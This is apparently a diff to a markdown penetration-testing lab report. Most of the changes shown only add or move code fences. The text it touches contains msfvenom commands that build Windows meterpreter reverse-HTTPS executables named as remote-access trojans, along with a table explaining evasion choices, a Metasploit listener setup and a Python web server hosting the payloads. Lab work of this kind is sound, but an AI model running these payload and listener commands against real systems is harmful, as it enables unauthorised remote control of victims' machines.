@@ -32,7 +32,7 @@ The assessment identified a critical misconfiguration in the local security poli
 # Payload Generation
 msfvenom -p windows/x64/meterpreter/reverse_https LHOST=192.168.92.136 LPORT=14000 -f exe -o RATa.exe
 msfvenom -p windows/x64/meterpreter/reverse_https LHOST=192.168.92.136 LPORT=14000 -f exe -o RATb.exe   #Payload for option b, port selection assumes previous payload was ended
-
+```
 | Parameter | Value | Justification |
 |:---|:---|:---|
 | `-p windows/x64/meterpreter/reverse_https` | Payload module | x64 architecture matches target Windows 10 VM; HTTPS encapsulates C2 traffic in TLS to evade network inspection |
@@ -40,14 +40,16 @@ msfvenom -p windows/x64/meterpreter/reverse_https LHOST=192.168.92.136 LPORT=140
 | `LPORT=14000` | Port | High port above 12000 as required; avoids well-known port scrutiny while satisfying lab constraints |
 | `-f exe` | Output format | Produces a standalone Windows executable suitable for direct execution |
 | `-o RATa.exe` | Output filename | Distinct name to differentiate from RATb across the two delivery vectors |
-
+```
+```
 # Listener Setup
 use exploit/multi/handler
 set payload windows/x64/meterpreter/reverse_https
 set LHOST 192.168.92.136
 set LPORT 14000
 exploit -j
-
+```
+```
 # RAT Hosting on C2
 cd ~/RATs
 python3 -m http.server 8080
